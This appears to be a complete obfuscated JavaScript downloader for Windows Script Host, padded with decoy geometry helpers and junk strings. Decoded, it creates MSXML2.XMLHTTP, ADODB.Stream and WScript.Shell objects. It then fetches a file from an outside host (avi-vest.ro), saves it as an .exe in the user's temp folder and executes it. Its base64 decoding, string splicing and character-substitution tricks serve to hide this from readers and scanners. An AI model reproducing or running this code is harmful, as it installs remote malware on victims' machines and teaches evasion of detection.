
var correlation = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  hankering = [];
	
var purple = { ':': '.','U': 'S','381': 'X'};
	var skating = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function backgrounds(organisms) {
	northeast = organisms;
	for (var i in purple){northeast = northeast.replace(i, purple[i]);}
    return northeast;
};

var cindy = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.backgrounds4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("moira").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = correlation[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = correlation[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = correlation[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = correlation[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var espouse ="moiraJVmoiraRFTVmoiraAl".backgrounds4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var classified = "moiraQWmoiraN0aXZmoiralWE9iamoiramVjdA=moira=".backgrounds4();
String.prototype.backgrounds2 = function () {
    var smithsonian = {
        bristol: this
    };
    smithsonian.phantom = smithsonian.bristol["c3Vic3RyaW5n".backgrounds4()](skating, cindy);
    return smithsonian.phantom;
};

var craftsmen ="moiraRXhwYW5moirakRW52aXmoiraJvbm1lbnRTdHJmoirapbmdz".backgrounds4();
var Native = function(options){
	
};
var naive = [classified, craftsmen,espouse,  ""+"."+("remark","guatemala","spine","transcendental","adjustment","recant","worthy","adjacent","exe"), "UnVu".backgrounds4(), backgrounds("M"+"SX"+"ML"+("emaciated","hobart","hopping","talmud","algebra","tendon","judge","2.")+"381M"+"LH"+"TT"+("vibrant","scion","again","inquiry","garrett","informal","proud","inlaid","P>")+"WU"+("instruction","weeks","howard","lurked","privileges","defend","bunsen","cr")+("consciousness","global","resorts","consistently","flare","motor","driven","christopher","ip")+"t:"+("itinerary","routing","judiciary","contributors","papua","school","satiate","lesser","Sh")+"ell")];
astronomer = "_F2_";
var exalt = this[naive.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
xusJKLhf = "ejyHMcu";
respected = (("flout", "occur", "bible", "angus", "aimed", "mitigate", "faces", "pwKIMkLAq") + "SbUccT").backgrounds2();
autos = (("purification", "folklore", "britain", "reinforcement", "foregone", "adventure", "archibald", "equanimity", "storm", "snoGlsvlFbYk") + "mdrdKR").backgrounds2();
  
    String.prototype.climb = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var floors = naive.pop().split(">");

panel = "b3Blbg==".backgrounds4();
var beach = new exalt(floors[1]);
var insecurity = new exalt(floors[0]);
var beleaguered = beach[naive.shift()](naive.shift());
weasel = "E";

var sponsored = naive.shift();
var unfettered = naive.shift();
function aimless(energy, advertised) {

    try {
        var providence = beleaguered + "/" + advertised ;
		providence = providence+ sponsored;
            insecurity[panel](("bakery","excessive","G" + weasel) + ("limiting","advocating","florists","condo","T"), energy, false);
       
    KXDmHQsDSf = "_F7_";
    insecurity[autos + ("synod","snout","end")]();
	var chancellor=("respected" + WScript=="respected" + "V2luZG93cyBTY3JpcHQgSG9zdA==".backgrounds4())&&insecurity["c3RhdHVz".backgrounds4()] +""=="MjAw".backgrounds4()&&typeof(ncpztxu)==="undefined";
	lQHNgR = "_F8_";
    if (chancellor) {
		
        var shadow = new exalt((("solicitor","presage","repeal","attack","obituaries","disorder","kinswoman","voice","A")+("navel","ozone","autonomous","preferment","abdication","elate","scurrilous","wield","SEOO")+"DB"+("exalting","remonstrate","arabic","cognate","tasmania","smithsonian","surveillance",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        shadow[panel]();
        eazcLlA = "_F9_";
        shadow.type = cindy;
        edAXjjtiY = "_F10_";
        shadow["d3JpdGU=".backgrounds4()](insecurity[("transmutation","flush","probably","confidante","precedence","tumor","preservative","")+"R"+"es"+"pon"+purple['U'].toLowerCase()+"e"+"Qm9keQ==".backgrounds4()]);
        bXtaRsAQKi = "_F11_";
        shadow[(respected + "o"+("itself","dexterously","pockets","emission","hooked","stumble","evergreen","commune","00")+("technical","transcendental","eastern","ignored","chester","hygiene","large","8i")+"tion").replace("0"+("boobs","prefixed","solidarity","unformed","shipping","funding","hudson","08"), autos)] = 0;
        MISHANHlVQ = "_F12_";
        shadow.saveToFile(providence, 2);
        gqoArg = "_F13_";
        shadow.close();
        dIgzJwwPeih = "_F14_";
		beach[unfettered](providence, cindy, true);
    }
} catch (UzsPqtGqI) { };

    KVdQaQdK = "_F15_";
}
try{
aimless("aHR0cDovLw==".backgrounds4()+"\u0061\u0076\u0069\u002D\u0076\u0065\u0073\u0074"+"\u002E\u0072\u006F\u002F\u0033\u0067\u0033\u0034\u0074\u0033\u0074\u0034\u0074\u0067\u0067\u0072\u0074" + "?atQHyDmX=lKJzeuVA","zWgKPqGWkv");}catch(wEMsPghdQSm){}

   ujeWKl = "_F16_";
   